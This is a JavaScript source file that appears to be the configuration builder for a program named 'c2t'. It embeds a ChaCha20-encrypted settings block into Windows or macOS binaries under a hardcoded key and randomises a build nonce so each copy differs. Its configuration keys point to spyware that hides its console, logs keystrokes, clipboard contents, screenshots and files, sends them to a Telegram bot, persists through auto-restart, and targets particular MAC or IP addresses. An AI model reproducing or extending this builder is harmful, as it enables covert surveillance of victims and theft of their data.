const MAGIC = Uint8Array.from([
  0x43, 0x32, 0x54, 0x43, 0x46, 0x47, 0x00, 0xa7,
  0x31, 0xd5, 0x6c, 0x92, 0xe8, 0x4b, 0xf0, 0x1d,
]);

export const VERSION = 2;
const HEADER_SIZE = 32;
const PAYLOAD_CAPACITY = 4096;
const REGION_SIZE = HEADER_SIZE + PAYLOAD_CAPACITY;

export const EMBEDDED_KEY = Uint8Array.from([
  0x8f, 0x1d, 0x4e, 0x93, 0x6a, 0x2b, 0x5c, 0x71,
  0x3e, 0x09, 0xba, 0xd4, 0x2f, 0x88, 0x19, 0xc3,
  0x77, 0x51, 0x9a, 0x42, 0xe6, 0x3d, 0x1b, 0x68,
  0x54, 0x0e, 0x82, 0xbf, 0x33, 0x7a, 0x9c, 0xd0,
]);

function rotl(v, n) {
  return ((v << n) | (v >>> (32 - n))) >>> 0;
}

function chacha20Block(state) {
  const out = new Uint32Array(state);
  for (let i = 0; i < 10; i += 1) {
    out[0] = (out[0] + out[4]) >>> 0; out[12] = rotl(out[12] ^ out[0], 16);
    out[8] = (out[8] + out[12]) >>> 0; out[4] = rotl(out[4] ^ out[8], 12);
    out[0] = (out[0] + out[4]) >>> 0; out[12] = rotl(out[12] ^ out[0], 8);
    out[8] = (out[8] + out[12]) >>> 0; out[4] = rotl(out[4] ^ out[8], 7);

    out[1] = (out[1] + out[5]) >>> 0; out[13] = rotl(out[13] ^ out[1], 16);
    out[9] = (out[9] + out[13]) >>> 0; out[5] = rotl(out[5] ^ out[9], 12);
    out[1] = (out[1] + out[5]) >>> 0; out[13] = rotl(out[13] ^ out[1], 8);
    out[9] = (out[9] + out[13]) >>> 0; out[5] = rotl(out[5] ^ out[9], 7);

    out[2] = (out[2] + out[6]) >>> 0; out[14] = rotl(out[14] ^ out[2], 16);
    out[10] = (out[10] + out[14]) >>> 0; out[6] = rotl(out[6] ^ out[10], 12);
    out[2] = (out[2] + out[6]) >>> 0; out[14] = rotl(out[14] ^ out[2], 8);
    out[10] = (out[10] + out[14]) >>> 0; out[6] = rotl(out[6] ^ out[10], 7);

    out[3] = (out[3] + out[7]) >>> 0; out[15] = rotl(out[15] ^ out[3], 16);
    out[11] = (out[11] + out[15]) >>> 0; out[7] = rotl(out[7] ^ out[11], 12);
    out[3] = (out[3] + out[7]) >>> 0; out[15] = rotl(out[15] ^ out[3], 8);
    out[11] = (out[11] + out[15]) >>> 0; out[7] = rotl(out[7] ^ out[11], 7);

    out[0] = (out[0] + out[5]) >>> 0; out[15] = rotl(out[15] ^ out[0], 16);
    out[10] = (out[10] + out[15]) >>> 0; out[5] = rotl(out[5] ^ out[10], 12);
    out[0] = (out[0] + out[5]) >>> 0; out[15] = rotl(out[15] ^ out[0], 8);
    out[10] = (out[10] + out[15]) >>> 0; out[5] = rotl(out[5] ^ out[10], 7);

    out[1] = (out[1] + out[6]) >>> 0; out[12] = rotl(out[12] ^ out[1], 16);
    out[11] = (out[11] + out[12]) >>> 0; out[6] = rotl(out[6] ^ out[11], 12);
    out[1] = (out[1] + out[6]) >>> 0; out[12] = rotl(out[12] ^ out[1], 8);
    out[11] = (out[11] + out[12]) >>> 0; out[6] = rotl(out[6] ^ out[11], 7);

    out[2] = (out[2] + out[7]) >>> 0; out[13] = rotl(out[13] ^ out[2], 16);
    out[8] = (out[8] + out[13]) >>> 0; out[7] = rotl(out[7] ^ out[8], 12);
    out[2] = (out[2] + out[7]) >>> 0; out[13] = rotl(out[13] ^ out[2], 8);
    out[8] = (out[8] + out[13]) >>> 0; out[7] = rotl(out[7] ^ out[8], 7);

    out[3] = (out[3] + out[4]) >>> 0; out[14] = rotl(out[14] ^ out[3], 16);
    out[9] = (out[9] + out[14]) >>> 0; out[4] = rotl(out[4] ^ out[9], 12);
    out[3] = (out[3] + out[4]) >>> 0; out[14] = rotl(out[14] ^ out[3], 8);
    out[9] = (out[9] + out[14]) >>> 0; out[4] = rotl(out[4] ^ out[9], 7);
  }
  for (let i = 0; i < 16; i += 1) {
    out[i] = (out[i] + state[i]) >>> 0;
  }
  return out;
}

export function chacha20Crypt(key, nonce, counter, input) {
  const state = new Uint32Array(16);
  state[0] = 0x61707865;
  state[1] = 0x3330322d;
  state[2] = 0x79622d32;
  state[3] = 0x6b206574;
  const keyView = new DataView(key.buffer, key.byteOffset, key.byteLength);
  for (let i = 0; i < 8; i += 1) {
    state[4 + i] = keyView.getUint32(i * 4, true);
  }
  state[12] = counter >>> 0;
  const nonceView = new DataView(nonce.buffer, nonce.byteOffset, nonce.byteLength);
  state[13] = nonceView.getUint32(0, true);
  state[14] = nonceView.getUint32(4, true);
  state[15] = nonceView.getUint32(8, true);

  const output = new Uint8Array(input.length);
  let offset = 0;
  while (offset < input.length) {
    const block = chacha20Block(state);
    const blockBytes = new Uint8Array(block.buffer);
    const take = Math.min(64, input.length - offset);
    for (let i = 0; i < take; i += 1) {
      output[offset + i] = input[offset + i] ^ blockBytes[i];
    }
    state[12] = (state[12] + 1) >>> 0;
    offset += take;
  }
  return output;
}

export const FLAG_KEYS = new Set([
  "C2T_VERBOSE",
  "C2T_LOG_FILE",
  "C2T_SAVE_STATE",
  "C2T_AUTO_RESTART",
  "C2T_HIDE_CONSOLE",
  "HIDE_CONSOLE",
  "TELEGRAM_ENABLED",
  "TELEGRAM_DEDUPLICATE",
  "TELEGRAM_SEND_FILES",
  "TELEGRAM_SEND_WINDOW_INFO",
  "TELEGRAM_SEND_LOGS",
  "TELEGRAM_SEND_SCREENSHOTS",
  "TELEGRAM_SEND_SCREENSHOT",
  "SEND_SCREENSHOTS",
  "TELEGRAM_SEND_KEYBOARD",
  "C2T_DISABLE_KEYBOARD",
  "DISABLE_KEYBOARD",
  "TELEGRAM_SEND_CLIPBOARD",
  "C2T_DISABLE_CLIPBOARD",
  "DISABLE_CLIPBOARD",
  "C2T_DISABLE_SCREENSHOT",
  "DISABLE_SCREENSHOT",
  "C2T_KEYBOARD_SHORTCUTS",
  "KEYBOARD_SHORTCUTS",
  "TELEGRAM_KEYBOARD_SHORTCUTS",
]);

export const SENSITIVE_KEYS = new Set([
  "TELEGRAM_BOT_TOKEN",
  "TELEGRAM_CHAT_ID",
  "C2T_PROXY",
  "TELEGRAM_PROXY",
  "C2T_ALLOWED_MAC",
  "ALLOWED_MAC",
  "C2T_ALLOWED_IP",
  "ALLOWED_IP",
]);

export const STRING_KEYS = new Set([
  "C2T_NONCE",
  "C2T_BUILD_ID",
  "C2T_DAEMON_NAME",
  "C2T_SUPERVISOR_NAME",
  "C2T_KEYBOARD_LAYOUT",
  "TELEGRAM_KEYBOARD_LAYOUT",
  "KEYBOARD_LAYOUT",
  "C2T_SCREENSHOT_FORMAT",
  "TELEGRAM_SCREENSHOT_FORMAT",
  "SCREENSHOT_FORMAT",
  "C2T_ALLOWED_MAC",
  "ALLOWED_MAC",
  "C2T_ALLOWED_IP",
  "ALLOWED_IP",
]);

export const ALLOWED_KEYS = new Set([
  ...FLAG_KEYS,
  ...SENSITIVE_KEYS,
  ...STRING_KEYS,
  "TELEGRAM_LOG_INTERVAL_SEC",
  "TELEGRAM_SCREENSHOT_INTERVAL_SEC",
  "C2T_SCREENSHOT_QUALITY",
  "TELEGRAM_SCREENSHOT_QUALITY",
  "SCREENSHOT_QUALITY",
  "TELEGRAM_MAX_FILE_BYTES",
  "C2T_QUEUE_MAX_BYTES",
  "C2T_QUEUE_MAX_ITEMS",
  "C2T_DELIVERY_ATTEMPTS",
  "C2T_RETRY_DELAY_MS",
  "C2T_KEYBOARD_FLUSH_MS",
]);

const SIZE_KEYS = new Set(
  [...ALLOWED_KEYS].filter(
    (key) => !FLAG_KEYS.has(key) && !SENSITIVE_KEYS.has(key) && !STRING_KEYS.has(key),
  ),
);

export function generateRandomNonce(length = 32) {
  const bytes = new Uint8Array(Math.ceil(length / 2));
  if (typeof crypto !== "undefined" && typeof crypto.getRandomValues === "function") {
    crypto.getRandomValues(bytes);
  } else {
    for (let i = 0; i < bytes.length; i += 1) {
      bytes[i] = Math.floor(Math.random() * 256);
    }
  }
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("").slice(0, length);
}

function writeUint32(view, offset, value) {
  view.setUint32(offset, value >>> 0, true);
}

export function crc32(bytes) {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) {
      crc = (crc >>> 1) ^ ((crc & 1) ? 0xedb88320 : 0);
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

export function validateConfig(config) {
  const normalized = {};
  for (const [key, rawValue] of Object.entries(config)) {
    if (!ALLOWED_KEYS.has(key)) {
      throw new Error(`Unknown configuration key: ${key}`);
    }
    const value = String(rawValue);
    if (value.includes("\0") || value.includes("\n") || value.includes("\r")) {
      throw new Error(`${key} contains a forbidden character`);
    }
    if (FLAG_KEYS.has(key) && value !== "0" && value !== "1") {
      throw new Error(`${key} must be 0 or 1`);
    }
    if (SIZE_KEYS.has(key) && !/^[1-9][0-9]*$/.test(value)) {
      throw new Error(`${key} must be a positive decimal integer`);
    }
    if (STRING_KEYS.has(key) && !/^[a-zA-Z0-9_.-]{1,64}$/.test(value)) {
      throw new Error(`${key} must be 1-64 alphanumeric characters (_.- allowed)`);
    }
    const byteLength = new TextEncoder().encode(value).length;
    if (key === "TELEGRAM_BOT_TOKEN" && byteLength >= 512) {
      throw new Error("The Telegram bot token is too long");
    }
    if (key === "TELEGRAM_CHAT_ID" && byteLength >= 128) {
      throw new Error("The Telegram chat ID is too long");
    }
    if ((key === "C2T_PROXY" || key === "TELEGRAM_PROXY") && byteLength >= 512) {
      throw new Error("The proxy server address is too long");
    }
    normalized[key] = value;
  }
  return normalized;
}

export function encodePayload(config) {
  const normalized = validateConfig(config);
  const text = Object.keys(normalized)
    .sort()
    .map((key) => `${key}=${normalized[key]}\n`)
    .join("");
  const payload = new TextEncoder().encode(text);
  if (payload.length > PAYLOAD_CAPACITY) {
    throw new Error(
      `The configuration uses ${payload.length} bytes; the limit is ${PAYLOAD_CAPACITY}`,
    );
  }
  return payload;
}

export function locateRegion(binary) {
  const offsets = [];
  outer: for (let offset = 0; offset <= binary.length - MAGIC.length; offset += 1) {
    for (let index = 0; index < MAGIC.length; index += 1) {
      if (binary[offset + index] !== MAGIC[index]) continue outer;
    }
    offsets.push(offset);
  }
  if (offsets.length !== 1) {
    throw new Error(
      `Expected one c2t configuration region, found ${offsets.length}`,
    );
  }
  const offset = offsets[0];
  if (offset + REGION_SIZE > binary.length) {
    throw new Error("Truncated c2t configuration region");
  }
  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const version = view.getUint32(offset + 16, true);
  if (version !== 1 && version !== 2) {
    throw new Error("Unsupported embedded configuration version");
  }
  return offset;
}

function peChecksumOffset(binary) {
  if (binary[0] !== 0x4d || binary[1] !== 0x5a) return null;
  if (binary.length < 0x40) throw new Error("Truncated PE DOS header");

  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const peOffset = view.getUint32(0x3c, true);
  const optionalOffset = peOffset + 24;
  if (
    optionalOffset + 2 > binary.length ||
    binary[peOffset] !== 0x50 || binary[peOffset + 1] !== 0x45 ||
    binary[peOffset + 2] !== 0 || binary[peOffset + 3] !== 0
  ) {
    throw new Error("Invalid PE header");
  }

  const optionalMagic = view.getUint16(optionalOffset, true);
  let directoryCountOffset;
  let directoriesOffset;
  if (optionalMagic === 0x10b) {
    directoryCountOffset = optionalOffset + 92;
    directoriesOffset = optionalOffset + 96;
  } else if (optionalMagic === 0x20b) {
    directoryCountOffset = optionalOffset + 108;
    directoriesOffset = optionalOffset + 112;
  } else {
    throw new Error("Unsupported PE optional header");
  }

  if (directoryCountOffset + 4 > binary.length) {
    throw new Error("Truncated PE optional header");
  }
  if (view.getUint32(directoryCountOffset, true) > 4) {
    const certificateOffset = directoriesOffset + 4 * 8;
    if (certificateOffset + 8 > binary.length) {
      throw new Error("Truncated PE data directory");
    }
    if (
      view.getUint32(certificateOffset, true) !== 0 ||
      view.getUint32(certificateOffset + 4, true) !== 0
    ) {
      throw new Error("The PE file is signed; configure the unsigned binary instead");
    }
  }

  const checksumOffset = optionalOffset + 64;
  if (checksumOffset + 4 > binary.length) {
    throw new Error("Truncated PE checksum field");
  }
  return checksumOffset;
}

function peChecksum(binary, checksumOffset) {
  let checksum = 0;
  for (let offset = 0; offset < binary.length; offset += 2) {
    let word = 0;
    if (!(checksumOffset <= offset && offset < checksumOffset + 4)) {
      word = binary[offset];
      if (offset + 1 < binary.length) word |= binary[offset + 1] << 8;
    }
    checksum = (checksum & 0xffff) + word + (checksum >>> 16);
  }
  checksum = (checksum & 0xffff) + (checksum >>> 16);
  checksum = (checksum & 0xffff) + (checksum >>> 16);
  return ((checksum & 0xffff) + binary.length) >>> 0;
}

function rejectSignedMachO(binary) {
  if (
    binary.length < 4 || binary[0] !== 0xcf || binary[1] !== 0xfa ||
    binary[2] !== 0xed || binary[3] !== 0xfe
  ) return;
  if (binary.length < 32) throw new Error("Truncated 64-bit Mach-O header");
  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const commandCount = view.getUint32(16, true);
  const commandsSize = view.getUint32(20, true);
  let commandOffset = 32;
  const commandEnd = commandOffset + commandsSize;
  if (commandEnd > binary.length) throw new Error("Truncated Mach-O load commands");
  for (let index = 0; index < commandCount; index += 1) {
    if (commandOffset + 8 > commandEnd) throw new Error("Truncated Mach-O load command");
    const command = view.getUint32(commandOffset, true);
    const commandSize = view.getUint32(commandOffset + 4, true);
    if (commandSize < 8 || commandOffset + commandSize > commandEnd) {
      throw new Error("Invalid Mach-O load command size");
    }
    if (command === 0x1d) {
      throw new Error("The Mach-O file is code signed; use a macOS sidecar configuration");
    }
    commandOffset += commandSize;
  }
}

export function patchBinary(input, config, options = {}) {
  const binary = input instanceof Uint8Array ? input : new Uint8Array(input);
  rejectSignedMachO(binary);
  const offset = locateRegion(binary);
  const sourceView = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const inputVersion = sourceView.getUint32(offset + 16, true);
  const targetVersion = inputVersion === 1 ? 1 : VERSION;

  const effectiveConfig = { ...config };
  if (options.randomize !== false && !effectiveConfig.C2T_NONCE && !effectiveConfig.C2T_BUILD_ID) {
    effectiveConfig.C2T_NONCE = generateRandomNonce(32);
  }
  const plaintext = encodePayload(effectiveConfig);
  let finalPayload;
  if (plaintext.length > 0) {
    if (targetVersion === 2) {
      const nonce = new Uint8Array(12);
      if (typeof crypto !== "undefined" && typeof crypto.getRandomValues === "function") {
        crypto.getRandomValues(nonce);
      } else {
        for (let i = 0; i < 12; i += 1) {
          nonce[i] = Math.floor(Math.random() * 256);
        }
      }
      const ciphertext = chacha20Crypt(EMBEDDED_KEY, nonce, 0, plaintext);
      finalPayload = new Uint8Array(12 + ciphertext.length);
      finalPayload.set(nonce, 0);
      finalPayload.set(ciphertext, 12);
    } else {
      finalPayload = plaintext;
    }
  } else {
    finalPayload = new Uint8Array(0);
  }

  const result = new Uint8Array(binary);
  result.fill(0, offset, offset + REGION_SIZE);
  result.set(MAGIC, offset);
  const view = new DataView(result.buffer, result.byteOffset, result.byteLength);
  writeUint32(view, offset + 16, targetVersion);
  writeUint32(view, offset + 20, finalPayload.length);
  writeUint32(view, offset + 24, crc32(finalPayload));
  result.set(finalPayload, offset + HEADER_SIZE);

  if (result.length > 2 && result[0] === 0x4d && result[1] === 0x5a) {
    const text = new TextDecoder("ascii").decode(result);
    const nonceMatch = /<!-- Build Nonce: ([0-9a-fA-F]{32,64}) -->/.exec(text);
    if (nonceMatch) {
      const oldNonce = nonceMatch[1];
      const newNonce = generateRandomNonce(oldNonce.length);
      const newBytes = new TextEncoder().encode(newNonce);
      let searchIdx = 0;
      while ((searchIdx = text.indexOf(oldNonce, searchIdx)) !== -1) {
        result.set(newBytes, searchIdx);
        searchIdx += oldNonce.length;
      }
    }
  }

  const checksumOffset = peChecksumOffset(result);
  if (checksumOffset !== null) {
    writeUint32(view, checksumOffset, peChecksum(result, checksumOffset));
  }
  return result;
}
